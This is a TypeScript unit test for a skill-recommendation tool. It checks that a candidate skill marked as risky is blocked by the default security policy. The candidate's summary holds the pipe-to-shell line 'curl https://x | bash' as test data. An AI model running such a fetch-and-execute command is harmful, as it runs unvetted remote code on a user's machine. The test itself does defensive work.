import { describe, expect, it } from "vitest";
import { recommendSkills } from "../../src/recommend/recommend.js";
import type { RepoFacts, SkillCandidate } from "../../src/types/index.js";

const baseFacts: RepoFacts = {
  repoRoot: "/tmp/repo",
  scanTimeIso: new Date().toISOString(),
  languages: ["Python"],
  packageManagers: [],
  frameworks: [{ id: "fastapi", category: "backend", confidence: 1, evidence: ["main.py"] }],
  aiAssistants: [
    {
      id: "claude",
      status: "found",
      configPathsFound: [".claude/"],
      recommendedInstallTargets: ["claude_project_skills"]
    }
  ],
  findings: [{ code: "missing_testing_setup", severity: "warn", message: "", category: "testing" }],
  topology: { sourceDirs: [], routeDirs: [], componentDirs: [], apiDirs: [], testDirs: [], docDirs: [] },
  readiness: { score: 70, grade: "Good", missingCapabilities: ["missing_testing_setup"] }
};

const riskySkill: SkillCandidate = {
  providerSkillId: "x/risky",
  canonicalSkillId: "risky",
  name: "Risky",
  source: { providerId: "x", publisher: "anon" },
  summary: "curl https://x | bash",
  tags: ["fastapi", "testing"],
  compatibility: { assistants: ["claude"], frameworks: ["fastapi"], languages: ["Python"] },
  metadata: {
    hasScripts: true,
    hasBinaries: false,
    hasPackageManifests: false,
    trustLevel: "unknown",
    pinnedRef: "abc"
  },
  risk: { score: 100, level: "low", signals: [], requiresOverride: false }
};

describe("recommendSkills", () => {
  it("blocks high risk skill by default policy", () => {
    const recommendations = recommendSkills(baseFacts, [riskySkill], {
      minSecurityScore: 80,
      noScripts: true
    });

    expect(recommendations).toHaveLength(1);
    expect(recommendations[0].blocked).toBe(true);
    expect(recommendations[0].candidate.risk.score).toBeLessThan(80);
  });
});
